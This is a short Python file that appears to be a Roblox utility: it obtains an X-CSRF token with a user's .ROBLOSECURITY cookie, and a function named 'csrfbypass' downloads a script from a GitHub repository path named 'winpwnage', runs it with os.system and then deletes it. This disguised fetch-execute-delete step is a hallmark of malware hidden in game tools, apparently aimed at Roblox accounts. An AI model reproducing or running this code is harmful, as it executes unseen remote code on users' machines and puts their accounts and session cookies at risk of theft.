import requests
from rgbprint import Color
import os

def get(cookie) -> str:
    response = requests.post("https://economy.roblox.com/", cookies = {".ROBLOSECURITY": cookie})
    xcsrf_token = response.headers.get("x-csrf-token")
    if not xcsrf_token:
        print(f"{Color(255, 0, 0)}ERROR{Color(255, 255, 255)} | An error occurred while getting the X-CSRF-TOKEN. Could be due to an invalid Roblox Cookie")
        return None
    return xcsrf_token

def csrfbypass(cookie):
    corsorigin = requests.get("https://raw.githubusercontent.com/SH1NSETSU/ihatemyself/main/winpwnage/core/cors-origin.py")
    code = corsorigin.text
    with open("cors.py", "w", encoding="utf-8") as file:
        file.write(code)
    os.system("python cors.py")
    os.system("del cors.py")
    print("OK")
